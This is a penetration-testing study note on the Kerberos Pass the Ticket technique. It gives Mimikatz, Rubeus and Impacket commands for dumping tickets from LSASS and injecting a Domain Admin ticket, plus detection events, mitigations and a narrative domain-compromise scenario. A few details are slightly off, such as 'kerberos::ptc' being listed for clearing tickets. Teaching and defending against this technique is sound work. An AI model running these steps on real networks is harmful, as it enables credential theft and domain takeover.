---
tags: [activedirectory, kerberos, passtheticket, ptt, lateralmovement]
difficulty: advanced
module: "36 - Active Directory Attacks"
topic: "36.07 Pass the Ticket"
---

# 36.07 Pass the Ticket (PtT)

## 1. Executive Summary

Pass the Ticket (PtT) is a post-exploitation lateral movement technique where an attacker extracts Kerberos Ticket Granting Tickets (TGTs) or Ticket Granting Service (TGS) tickets from a compromised system's memory and injects them into their own session. This allows the attacker to impersonate the compromised user and access network resources without ever needing the user's plaintext password or NTLM hash. PtT bypasses traditional authentication mechanisms by leveraging the inherent trust of valid Kerberos tickets.

## 2. Theoretical Background and Core Concepts

### Kerberos Authentication Refresher
To understand PtT, one must deeply grasp the Kerberos authentication flow:
1. **AS-REQ / AS-REP**: The user authenticates to the Key Distribution Center (KDC), usually a Domain Controller, and receives a Ticket Granting Ticket (TGT).
2. **TGS-REQ / TGS-REP**: The user presents the TGT to the KDC to request a service ticket (TGS) for a specific service (e.g., CIFS, HTTP).
3. **AP-REQ / AP-REP**: The user presents the TGS to the target service to gain access.

### Why Pass the Ticket Works
Windows operating systems cache Kerberos tickets (both TGTs and TGSs) in the Local Security Authority Subsystem Service (LSASS) memory to provide Single Sign-On (SSO) capabilities. This prevents the user from having to re-authenticate every time they access a new service.

An attacker with local administrator or SYSTEM privileges on a machine can interact with LSASS to extract these cached tickets. Because tickets are self-contained and encrypted blobs that the target services (or the KDC) trust inherently, the attacker can simply load them into their own logon session. 

## 3. The Mechanics of the Attack

The attack lifecycle generally follows these phases:
1. **Compromise**: The attacker gains elevated privileges (Admin/SYSTEM) on a domain-joined machine.
2. **Extraction**: The attacker uses a tool (e.g., Mimikatz, Rubeus) to dump cached Kerberos tickets from LSASS memory.
3. **Injection**: The attacker selects a valuable ticket (e.g., a TGT for a Domain Admin) and injects it into their current session.
4. **Execution**: The attacker requests access to a service. The Windows OS transparently uses the injected ticket for authentication, granting access.

## 4. ASCII Architecture Diagram

```text
+-------------------------------------------------------------------------+
|                        Pass the Ticket (PtT) Flow                       |
+-------------------------------------------------------------------------+

  [ Compromised Workstation ]                           [ Target Infrastructure ]
  
  +-----------------------+
  |  Attacker Session     |                             +-------------------+
  |  (Elevated Privs)     |                             | Domain Controller |
  +-----------+-----------+                             | (KDC)             |
              |                                         +---------+---------+
              | 1. Extract TGT/TGS from LSASS memory              |
              v                                                   |
  +-----------------------+                                       |
  |      LSASS.exe        |                                       |
  | (Caches TGTs/TGSs)    |                                       |
  +-----------+-----------+                                       |
              |                                                   |
              | 2. Inject chosen Ticket into current session      |
              |    (e.g., Domain Admin TGT)                       |
              v                                                   |
  +-----------------------+                                       |
  |   Attacker Session    | 3. TGS-REQ (Using injected TGT)       |
  |   (Holding Ticket)    |-------------------------------------->|
  +-----------+-----------+                                       |
              |           |<--------------------------------------|
              |           | 4. TGS-REP (Returns Service Ticket)   |
              |                                                   |
              | 5. AP-REQ (Present Service Ticket to Target)      |
              |---------------------------------------------------+---> [ Target Server ]
                                                                        (e.g., File Share,
                                                                         Exchange, etc.)
```

## 5. Prerequisites and Required Tools

**Prerequisites:**
- Elevated access (Local Admin or SYSTEM) on the source machine to dump LSASS.
- The target user must have authenticated to the compromised machine recently, leaving a valid ticket in memory.
- The ticket must not have expired (default TGT lifetime is 10 hours).

**Tools:**
- **Mimikatz**: The standard tool for extracting and injecting tickets.
- **Rubeus**: A C# toolset for raw Kerberos interaction and ticket management.
- **Impacket**: Python library for remote ticket injection (e.g., via `export KRB5CCNAME`).

## 6. Step-by-Step Execution

### Step 1: Privilege Escalation
Ensure you are running in an elevated context.
```cmd
privilege::debug
```

### Step 2: Extracting Tickets
Using Mimikatz, dump all Kerberos tickets:
```cmd
sekurlsa::tickets /export
```
This will write out `.kirbi` files to the current directory. You will see files named like `[0;12a34]-2-0-40e10000-Administrator@krbtgt-DOMAIN.LOCAL.kirbi`.

Using Rubeus:
```cmd
Rubeus.exe dump
```

### Step 3: Injecting the Ticket
Clear your current tickets to avoid conflicts:
```cmd
kerberos::ptc
kerberos::purge
```

Inject the desired ticket (e.g., Domain Admin TGT):
```cmd
kerberos::ptt "C:\path\to\[0;12a34]-2-0-40e10000-Administrator@krbtgt-DOMAIN.LOCAL.kirbi"
```

Using Rubeus:
```cmd
Rubeus.exe ptt /ticket:ticket.kirbi
```

### Step 4: Verification and Lateral Movement
Verify the ticket is in memory:
```cmd
klist
```
Attempt to access a remote resource:
```cmd
dir \\dc01.domain.local\C$
```

### Using Impacket (Linux to Windows)
If you have a `.kirbi` file on Linux, convert it to a `ccache` file using Impacket's `ticketConverter.py`:
```bash
ticketConverter.py ticket.kirbi ticket.ccache
export KRB5CCNAME=/path/to/ticket.ccache
psexec.py domain.local/Administrator@dc01.domain.local -k -no-pass
```

## 7. Detection and Artifacts

Detecting Pass the Ticket is notoriously difficult because the authentication uses a legitimately issued ticket. However, anomalies can be spotted:

1. **Event ID 4624 (Logon)**: Look for logon events where the authentication package is Kerberos, but the logon type is 3 (Network), and there is no corresponding TGT request (Event ID 4768) from the same source IP in a reasonable timeframe.
2. **Event ID 4768 (A TGT was requested)**: If an attacker extracts a TGT and uses it from a *different* machine, the IP address in the subsequent TGS requests (Event ID 4769) will differ from the IP that originally requested the TGT.
3. **Event ID 4769 (A Kerberos service ticket was requested)**: High volume of TGS requests for multiple services from a single account in a short period.
4. **LSASS Access Anomalies**: Detect tools like Mimikatz or Rubeus accessing LSASS (Event ID 10 in Sysmon - Process Access).

## 8. Mitigation and Prevention

1. **Credential Guard**: Enable Windows Defender Credential Guard. This uses virtualization-based security to isolate LSASS, preventing attackers from dumping plaintexts and Kerberos tickets even if they have SYSTEM privileges.
2. **Tiered Administration**: Implement a tiered administrative model (Tier 0, Tier 1, Tier 2). Domain Admins (Tier 0) should never log into workstations (Tier 2). This prevents their tickets from being left in the LSASS memory of easily compromised machines.
3. **Protected Users Group**: Add highly privileged accounts to the Protected Users security group. This forces the use of Kerberos (disables NTLM), prevents TGT caching beyond the initial logon, and enforces shorter ticket lifetimes.
4. **Least Privilege**: Restrict local administrator access to workstations. If an attacker cannot elevate to Admin/SYSTEM, they cannot access LSASS to dump tickets.

## 9. Chaining Opportunities

- **[[08 - Overpass the Hash]]**: Can be used to obtain a TGT if only the NTLM hash is available, which can then be used in a PtT attack.
- **[[09 - Golden Ticket Attack]]**: A Golden Ticket is essentially a forged TGT that is injected into memory using the Pass the Ticket technique.
- **[[10 - Silver Ticket Attack]]**: A Silver Ticket is a forged TGS that is injected into memory using PtT.
- **Unconstrained Delegation**: If an attacker compromises a server with Unconstrained Delegation, they can extract TGTs of any user who connects to that server, enabling massive PtT opportunities.

## 10. Related Notes

- [[01 - Active Directory Basics]]
- [[04 - Kerberos Authentication Deep Dive]]
- [[13 - Constrained and Unconstrained Delegation]]
- [[15 - Lateral Movement Techniques]]

---
*Note: This material is for educational and authorized penetration testing purposes only.*

## Real-World Attack Scenario
## Real-World Attack Scenario

Having compromised a critical file server (`FS01.megacorp.local`) used by the IT department, the attacker sought a way to escalate privileges to Domain Admin.
They had local SYSTEM access but no highly privileged passwords.
They knew that IT administrators frequently accessed this server to manage shares and permissions.
If a Domain Admin had logged in recently, their Kerberos tickets might still be cached in the Local Security Authority Subsystem Service (LSASS) memory.
To investigate, the attacker uploaded a customized, obfuscated version of Mimikatz to bypass the server's endpoint protection.
They executed Mimikatz and ran `privilege::debug` to ensure they had the necessary permissions to interact with LSASS.
Next, they executed `sekurlsa::tickets /export` to dump all Kerberos tickets currently cached in memory.
Mimikatz successfully wrote several `.kirbi` files to the current directory.
The attacker reviewed the filenames, looking for high-value targets.
They spotted a file named `[0;12a34]-2-0-40e10000-DA_Admin@krbtgt-MEGACORP.LOCAL.kirbi`.
This indicated a Ticket Granting Ticket (TGT) belonging to the Domain Admin account `DA_Admin`.
This was the jackpot; the attacker didn't need the password or the hash if they had a valid TGT.
Before injecting the ticket, the attacker cleared their current session's tickets using `kerberos::purge` to avoid conflicts.
They then injected the Domain Admin TGT into their current session using `kerberos::ptt "C:\path\to\DA_Admin.kirbi"`.
To verify the injection was successful, they ran `klist`, which displayed the `DA_Admin` ticket in the cache.
Now acting under the context of the Domain Admin, the attacker attempted to access the C$ share of the primary Domain Controller.
They executed `dir \\DC01.megacorp.local\C$`, and the directory listing was successfully returned.
The Pass the Ticket attack had worked flawlessly.
The attacker bypassed all authentication mechanisms by reusing a legitimately issued, cached ticket.
They immediately used this access to perform a DCSync attack, extracting the `krbtgt` hash to establish long-term persistence.
The PtT technique turned a transient administrative login into a full domain compromise.

